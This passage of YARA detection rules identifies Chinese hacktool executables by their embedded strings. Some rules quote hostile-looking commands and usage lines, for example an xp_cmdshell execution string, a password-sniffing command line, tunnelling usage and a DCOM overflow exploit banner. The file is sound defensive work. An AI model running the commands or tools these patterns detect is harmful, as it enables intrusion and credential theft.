vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Project1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"EXEC master.dbo.sp_addextendedproc 'xp_cmdshell','xplog70.dll'\" fullword ascii\n        $s2 = \"Password.txt\" fullword ascii\n        $s3 = \"LoginPrompt\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 5000KB and all of them\n}\n\nrule ChineseHacktools_Arp_EMP_v1_0\n{\n    meta:\n        description = \"Chinese hacktool (file: Arp EMP v1.0.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Arp_EMP_v1_0\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"Arp EMP v1.0.exe\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 800KB and all of them\n}\n\nrule ChineseHacktools_MyUPnP\n{\n    meta:\n        description = \"Chinese hacktool (file: MyUPnP.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Tools_MyUPnP\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"<description>BYTELINKER.COM</description>\" fullword ascii\n        $s2 = \"myupnp.exe\" fullword ascii\n        $s3 = \"LOADER ERROR\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 1500KB and all of them\n}\n\nrule ChineseHacktools_Shiell\n{\n    meta:\n        description = \"Chinese hacktool (file: Shiell.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Tools_Shiell\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"C:\\\\Users\\\\Tong\\\\Documents\\\\Visual Studio 2012\\\\Projects\\\\Shift shell\" ascii\n        $s2 = \"C:\\\\Windows\\\\System32\\\\Shiell.exe\" fullword wide\n        $s3 = \"Shift shell.exe\" fullword wide\n        $s4 = \"\\\" /v debugger /t REG_SZ /d \\\"\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 1500KB and 2 of them\n}\n\nrule ChineseHacktools_cndcom_cndcom\n{\n    meta:\n        description = \"Chinese hacktool (file: cndcom.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"cndcom_cndcom\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"- Rewritten by HDM last <hdm [at] metasploit.com>\" fullword ascii\n        $s2 = \"- Usage: %s <Target ID> <Target IP>\" fullword ascii\n        $s3 = \"- Remote DCOM RPC Buffer Overflow Exploit\" fullword ascii\n        $s4 = \"- Warning:This Code is more like a dos tool!(Modify by pingker)\" fullword ascii\n        $s5 = \"Windows NT SP6 (Chinese)\" fullword ascii\n        $s6 = \"- Original code by FlashSky and Benjurry\" fullword ascii\n        $s7 = \"\\\\C$\\\\123456111111111111111.doc\" fullword wide\n        $s8 = \"shell3all.c\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 100KB and 2 of them\n}\n\nrule ChineseHacktools_IsDebug_V1_4\n{\n    meta:\n        description = \"Chinese hacktool (file: IsDebug V1.4.dll)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"IsDebug_V1_4\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"IsDebug.dll\" fullword ascii\n        $s1 = \"SV Dumper V1.0\" fullword wide\n        $s2 = \"(IsDebuggerPresent byte Patcher)\" fullword ascii\n        $s8 = \"Error WriteMemory failed\" fullword ascii\n        $s9 = \"IsDebugPresent\" fullword ascii\n        $s10 = \"idb_Autoload\" fullword ascii\n        $s11 = \"Bin Files\" fullword ascii\n        $s12 = \"MASM32 version\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 30KB and all of them\n}\n\nrule ChineseHacktools_HTTPSCANNER\n{\n    meta:\n        description = \"Chinese hacktool (file: HTTPSCANNER.EXE)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"HTTPSCANNER\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"HttpScanner.exe\" fullword wide\n        $s2 = \"HttpScanner\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 3500KB and all of them\n}\n\nrule ChineseHacktools_HScan_v1_20_PipeCmd\n{\n    meta:\n        description = \"Chinese hacktool (file: PipeCmd.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"HScan_v1_20_PipeCmd\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"%SystemRoot%\\\\system32\\\\PipeCmdSrv.exe\" fullword ascii\n        $s2 = \"PipeCmd.exe\" fullword wide\n        $s3 = \"Please Use NTCmd.exe Run This Program.\" fullword ascii\n        $s4 = \"%s\\\\pipe\\\\%s%s%d\" fullword ascii\n        $s5 = \"\\\\\\\\.\\\\pipe\\\\%s%s%d\" fullword ascii\n        $s6 = \"%s\\\\ADMIN$\\\\System32\\\\%s%s\" fullword ascii\n        $s7 = \"This is a service executable! Couldn't start directly.\" fullword ascii\n        $s8 = \"Connecting to Remote Server ...Failed\" fullword ascii\n        $s9 = \"PIPECMDSRV\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 200KB and 4 of them\n}\n\nrule ChineseHacktools_Dos_fp\n{\n    meta:\n        description = \"Chinese hacktool (file: fp.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Dos_fp\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"fpipe -l 53 -s 53 -r 80 192.168.1.101\" fullword ascii\n        $s2 = \"FPipe.exe\" fullword wide\n        $s3 = \"http://www.foundstone.com\" fullword ascii\n        $s4 = \"%s %s port %d. Address is already in use\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 65KB and all of them\n}\n\nrule ChineseHacktools_Dos_netstat\n{\n    meta:\n        description = \"Chinese hacktool (file: netstat.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Dos_netstat\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"w03a2409.dll\" fullword ascii\n        $s1 = \"Retransmission Timeout Algorithm    = unknown (%1!u!)\" fullword wide\n        $s2 = \"Administrative Status  = %1!u!\" fullword wide\n        $s3 = \"Packet Too Big            %1!-10u!  %2!-10u!\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 150KB and all of them\n}\n\nrule ChineseHacktools_xsniff\n{\n    meta:\n        description = \"Chinese hacktool (file: xsniff.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Tools_xsniff\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"xsiff.exe -pass -hide -log pass.log\" fullword ascii\n        $s1 = \"HOST: %s USER: %s, PASS: %s\" fullword ascii\n        $s2 = \"xsiff.exe -tcp -udp -asc -addr 192.168.1.1\" fullword ascii\n        $s10 = \"Code by glacier <glacier@xfocus.org>\" fullword ascii\n        $s11 = \"%-5s%s->%s Bytes=%d TTL=%d Type: %d,%d ID=%d SEQ=%d\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 220KB and 2 of them\n}\n\nrule ChineseHacktools_MSSqlPass\n{\n    meta:\n        description = \"Chinese hacktool (file: MSSqlPass.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"MSSqlPass\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"Reveals the passwords stored in the Registry by Enterprise Manager of SQL Server\" wide\n        $s1 = \"empv.exe\" fullword wide\n        $s2 = \"Enterprise Manager PassView\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 120KB and all of them\n}\n\nrule ChineseHacktools_WSockExpert\n{\n    meta:\n        description = \"Chinese hacktool (file: WSockExpert.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"WSockExpert\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"OpenProcessCmdExecute!\" fullword ascii\n        $s2 = \"http://www.hackp.com\" fullword ascii\n        $s3 = \"'%s' is not a valid time!'%s' is not a valid date and time\" fullword wide\n        $s4 = \"SaveSelectedFilterCmdExecute\" fullword ascii\n        $s5 = \"PasswordChar@\" fullword ascii\n        $s6 = \"WSockHook.DLL\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 2500KB and 4 of them\n}\n\nrule ChineseHacktools_Ms_Viru_racle\n{\n    meta:\n        description = \"Chinese hacktool (file: racle.dll)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Ms_Viru_racle\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"PsInitialSystemProcess @%p\" fullword ascii\n        $s1 = \"PsLookupProcessByProcessId(%u) Failed\" fullword ascii\n        $s2 = \"PsLookupProcessByProcessId(%u) => %p\" fullword ascii\n        $s3 = \"FirstStage() Loaded, CurrentThread @%p Stack %p - %p\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 210KB and all of them\n}\n\nrule ChineseHacktools_lamescan3\n{\n    meta:\n        description = \"Chinese hacktool (file: lamescan3.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"lamescan3\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"dic\\\\loginlist.txt\" fullword ascii\n        $s2 = \"Radmin.exe\" fullword ascii\n        $s3 = \"lamescan3.pdf!\" fullword ascii\n        $s4 = \"dic\\\\passlist.txt\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 3740KB and all of them\n}\n\nrule ChineseHacktools_pc\n{\n    meta:\n        description = \"Chinese hacktool (file: pc.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Tools_pc\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"\\\\svchost.exe\" fullword ascii\n        $s2 = \"%s%08x.001\" fullword ascii\n        $s3 = \"Qy001Service\" fullword ascii\n        $s4 = \"/.MIKY\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 300KB and all of them\n}\n\nrule ChineseHacktools_Dos_Down64\n{\n    meta:\n        description = \"Chinese hacktool (file: Down64.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Dos_Down64\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"C:\\\\Windows\\\\Temp\\\\Down.txt\" fullword wide\n        $s2 = \"C:\\\\Windows\\\\Temp\\\\Cmd.txt\" fullword wide\n        $s3 = \"C:\\\\Windows\\\\Temp\\\\\" fullword wide\n        $s4 = \"ProcessXElement\" fullword ascii\n        $s8 = \"down.exe\" fullword wide\n        $s20 = \"set_Timer1\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 150KB and all of them\n}\n\nrule ChineseHacktools_epathobj_exp32\n{\n    meta:\n        description = \"Chinese hacktool (file: epathobj_exp32.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"epathobj_exp32\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"Watchdog thread %d waiting on Mutex\" fullword ascii\n        $s1 = \"Exploit ok run command\" fullword ascii\n        $s2 = \"\\\\epathobj_exp\\\\Release\\\\epathobj_exp.pdb\" fullword ascii\n        $s3 = \"Alllocated userspace PATHRECORD () %p\" fullword ascii\n        $s4 = \"Mutex object did not timeout, list not patched\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 270KB and all of them\n}\n\nrule ChineseHacktools_Tools_unknown\n{\n    meta:\n        description = \"Chinese hacktool (file: unknown.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Tools_unknown\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"No data to read.$Can not bind in port range (%d - %d)\" fullword wide\n        $s2 = \"GET /ok.asp?id=1__sql__ HTTP/1.1\" fullword ascii\n        $s3 = \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\" fullword ascii\n        $s4 = \"Failed to clear tab control Failed to delete tab at index %d\\\"Failed to retrieve\" wide\n        $s5 = \"Host: 127.0.0.1\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 2500KB and 4 of them\n}\n\nrule ChineseHacktools_PLUGIN_AJunk\n{\n    meta:\n        description = \"Chinese hacktool (file: AJunk.dll)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"PLUGIN_AJunk\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"AJunk.dll\" fullword ascii\n        $s2 = \"AJunk.DLL\" fullword wide\n        $s3 = \"AJunk Dynamic Link Library\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 560KB and all of them\n}\n\nrule ChineseHacktools_IISPutScanner\n{\n    meta:\n        description = \"Chinese hacktool (file: IISPutScanner.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"IISPutScanner\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s2 = \"KERNEL32.DLL\" fullword ascii\n        $s3 = \"ADVAPI32.DLL\" fullword ascii\n        $s4 = \"VERSION.DLL\" fullword ascii\n        $s5 = \"WSOCK32.DLL\" fullword ascii\n        $s6 = \"COMCTL32.DLL\" fullword ascii\n        $s7 = \"GDI32.DLL\" fullword ascii\n        $s8 = \"SHELL32.DLL\" fullword ascii\n        $s9 = \"USER32.DLL\" fullword ascii\n        $s10 = \"OLEAUT32.DLL\" fullword ascii\n        $s11 = \"LoadLibraryA\" fullword ascii\n        $s12 = \"GetProcAddress\" fullword ascii\n        $s13 = \"VirtualProtect\" fullword ascii\n        $s14 = \"VirtualAlloc\" fullword ascii\n        $s15 = \"VirtualFree\" fullword ascii\n        $s16 = \"ExitProcess\" fullword ascii\n        $s17 = \"RegCloseKey\" fullword ascii\n        $s18 = \"GetFileVersionInfoA\" fullword ascii\n        $s19 = \"ImageList_Add\" fullword ascii\n        $s20 = \"BitBlt\" fullword ascii\n        $s21 = \"ShellExecuteA\" fullword ascii\n        $s22 = \"ActivateKeyboardLayout\" fullword ascii\n        $s23 = \"BBABORT\" fullword wide\n        $s25 = \"BBCANCEL\" fullword wide\n        $s26 = \"BBCLOSE\" fullword wide\n        $s27 = \"BBHELP\" fullword wide\n        $s28 = \"BBIGNORE\" fullword wide\n        $s29 = \"PREVIEWGLYPH\" fullword wide\n        $s30 = \"DLGTEMPLATE\" fullword wide\n        $s31 = \"TABOUTBOX\" fullword wide\n        $s32 = \"TFORM1\" fullword wide\n        $s33 = \"MAINICON\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 500KB and filesize > 350KB and all of them\n}\n\nrule ChineseHacktools_IDTools_For_WinXP_IdtTool_2\n{\n    meta:\n        description = \"Chinese hacktool (file: IdtTool.sys)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"IDTools_For_WinXP_IdtTool_2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"\\\\Device\\\\devIdtTool\" fullword wide\n        $s1 = \"IoDeleteSymbolicLink\" fullword ascii\n        $s3 = \"IoDeleteDevice\" fullword ascii\n        $s6 = \"IoCreateSymbolicLink\" fullword ascii\n        $s7 = \"IoCreateDevice\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 7KB and all of them\n}\n\nrule ChineseHacktools_hkmjjiis6\n{\n    meta:\n        description = \"Chinese hacktool (file: hkmjjiis6.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"hkmjjiis6\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"comspec\" fullword ascii\n        $s2 = \"user32.dlly\" ascii\n        $s3 = \"runtime error\" ascii\n        $s4 = \"WinSta0\\\\Defau\" ascii\n        $s5 = \"AppIDFlags\" fullword ascii\n        $s6 = \"GetLag\" fullword ascii\n        $s7 = \"* FROM IIsWebInfo\" ascii\n        $s8 = \"wmiprvse.exe\" ascii\n        $s9 = \"LookupAcc\" ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 70KB and all of them\n}\n\nrule ChineseHacktools_Dos_lcx\n{\n    meta:\n        description = \"Chinese hacktool (file: lcx.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Dos_lcx\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"c:\\\\Users\\\\careful_snow\\\\\" ascii\n        $s1 = \"Desktop\\\\Htran\\\\Release\\\\Htran.pdb\" ascii\n        $s3 = \"[SERVER]connection to %s:%d error\" fullword ascii\n        $s4 = \"-tran  <ConnectPort> <TransmitHost> <TransmitPort>\" fullword ascii\n        $s6 = \"=========== Code by lion & bkbll, Welcome to [url]http://www.cnhonker.com[/url] \" ascii\n        $s7 = \"[-] There is a error...Create a new connection.\" fullword ascii\n        $s8 = \"[+] Accept a Client on port %d from %s\" fullword ascii\n        $s11 = \"-slave  <ConnectHost> <ConnectPort> <TransmitHost> <TransmitPort>\" fullword ascii\n        $s13 = \"[+] Make a Connection to %s:%d....\" fullword ascii\n        $s16 = \"-listen <ConnectPort> <TransmitPort>\" fullword ascii\n        $s17 = \"[+] Waiting another Client on port:%d....\" fullword ascii\n        $s18 = \"[+] Accept a Client on port %d from %s ......\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 100KB and 2 of them\n}\n\nrule ChineseHacktools_x_way2_5_X_way\n{\n    meta:\n        description = \"Chinese hacktool (file: X-way.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"x_way2_5_X_way\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"TTFTPSERVERFRM\" fullword wide\n        $s1 = \"TPORTSCANSETFRM\" fullword wide\n        $s2 = \"TIISSHELLFRM\" fullword wide\n        $s3 = \"TADVSCANSETFRM\" fullword wide\n        $s4 = \"ntwdblib.dll\" fullword ascii\n        $s5 = \"TSNIFFERFRM\" fullword wide\n        $s6 = \"TCRACKSETFRM\" fullword wide\n        $s7 = \"TCRACKFRM\" fullword wide\n        $s8 = \"dbnextrow\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 1000KB and 5 of them\n}\n\nrule ChineseHacktools_tools_Sqlcmd\n{\n    meta:\n        description = \"Chinese hacktool (file: Sqlcmd.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"tools_Sqlcmd\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"[Usage]:  %s <HostName|IP> <UserName> <Password>\" fullword ascii\n        $s1 = \"=============By uhhuhy(Feb 18,2003) - http://www.cnhonker.net=============\" fullword ascii\n        $s4 = \"Cool! Connected to SQL server on %s successfully!\" fullword ascii\n        $s5 = \"EXEC master..xp_cmdshell \\\"%s\\\"\" fullword ascii\n        $s6 = \"=======================Sqlcmd v0.21 For HScan v1.20=======================\" fullword ascii\n        $s10 = \"Error,exit!\" fullword ascii\n        $s11 = \"Sqlcmd>\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 40KB and 3 of them\n}\n\nrule ChineseHacktools_Sword1_5\n{\n    meta:\n        description = \"Chinese hacktool (file: Sword1.5.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Sword1_5\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s3 = \"http://www.ip138.com/ip2city.asp\" fullword wide\n        $s4 = \"http://www.md5decrypter.co.uk/feed/api.aspx?\" fullword wide\n        $s6 = \"ListBox_Command\" fullword wide\n        $s13 = \"md=7fef6171469e80d32c0559f88b377245&submit=MD5+Crack\" fullword wide\n        $s18 = \"\\\\Set.ini\" fullword wide\n        $s19 = \"OpenFileDialog1\" fullword wide\n        $s20 = \" (*.txt)|*.txt\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 400KB and 4 of them\n}\n\nrule ChineseHacktools_Tools_scan\n{\n    meta:\n        description = \"Chinese hacktool (file: scan.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Tools_scan\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s2 = \"Shanlu Studio\" fullword wide\n        $s3 = \"_AutoAttackMain\" fullword ascii\n        $s4 = \"_frmIpToAddr\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 3000KB and all of them\n}\n\nrule ChineseHacktools_Dos_c\n{\n    meta:\n        description = \"Chinese hacktool (file: c.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Dos_c\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"!Win32 .EXE.\" fullword ascii\n        $s1 = \".MPRESS1\" fullword ascii\n        $s2 = \".MPRESS2\" fullword ascii\n        $s3 = \"XOLEHLP.dll\" fullword ascii\n        $s4 = \"</body></html>\" fullword ascii\n        $s8 = \"DtcGetTransactionManagerExA\" fullword ascii\n        $s9 = \"GetUserNameA\" fullword ascii\n\n    condition:\n        uint16(0) == 